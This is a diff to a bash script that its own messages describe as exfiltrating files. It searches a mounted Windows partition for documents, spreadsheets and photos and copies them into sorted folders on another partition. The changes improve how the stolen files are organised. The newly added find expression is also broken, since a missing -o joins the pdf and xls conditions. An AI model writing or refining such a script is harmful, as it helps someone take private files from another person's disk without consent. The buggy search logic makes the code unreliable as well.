@@ -36,16 +36,17 @@ fi
 echo "Defining source and destination directories..."
 source_dir="$windows_partition"
 destination_dir="$destination_partition"
-
+mkdir "$destination_dir/docs"
+mkdir "$destination_dir/photos"
 
 # Exfil document files
-document_files=$(find "$source_dir" -type f \( -iname "*.doc" -o -iname "*.docx" -o -iname "*.pdf" \))
+document_files=$(find "$source_dir" -type f \( -iname "*.doc" -o -iname "*.docx" -o -iname "*.pdf" -iname "*.xls" -o -iname "*.xlsx" \))
 
 if [ -n "$document_files" ]; then
    echo "Copying document files..."
    IFS=$'\n' # Set the internal field separator to handle filenames with spaces correctly
    for file in $document_files; do
-      cp "$file" "$destination_dir"
+      cp --parents -r "$file" "$destination_dir/docs/"
    done
    echo "Document files exfiltrated. Proceeding to photos..."
 else
@@ -59,7 +60,7 @@ if [ -n "$picture_files" ]; then
    echo "Copying photos..."
    IFS=$'\n' # Set the internal field separator to handle filenames with spaces correctly
    for file in $picture_files; do
-      cp "$file" "$destination_dir"
+      cp --parents -r "$file" "$destination_dir/photos/"
    done
    echo "Photos copied successfully. Exfil complete."
 else
